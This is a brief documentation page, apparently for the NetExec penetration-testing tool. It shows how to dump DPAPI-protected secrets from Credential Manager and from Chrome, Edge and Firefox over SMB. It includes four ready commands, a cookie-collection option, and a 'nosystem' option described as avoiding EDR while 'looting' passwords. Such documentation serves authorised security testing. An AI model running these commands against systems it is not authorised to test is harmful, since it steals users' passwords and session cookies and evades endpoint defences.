---
description: Dump DPAPI credentials using NetExec
---

# Dump DPAPI

You can dump DPAPI credentials using NetExec using the following option: `--dpapi`. It will get all secrets from Credential Manager, Chrome, Edge, Firefox. `--dpapi` supports the following options :

* cookies : Collect every cookies in browsers
* nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords :fire:

{% hint style="danger" %}
You need at least local admin privilege on the remote target, use **--local-auth** if your user is a local account
{% endhint %}

```bash
nxc smb $TARGET -u $USER -p $PASSWORD --dpapi
nxc smb $TARGET -u $USER -p $PASSWORD --dpapi cookies
nxc smb $TARGET -u $USER -p $PASSWORD --dpapi nosystem
nxc smb $TARGET -u $USER -p $PASSWORD --local-auth --dpapi nosystem
```
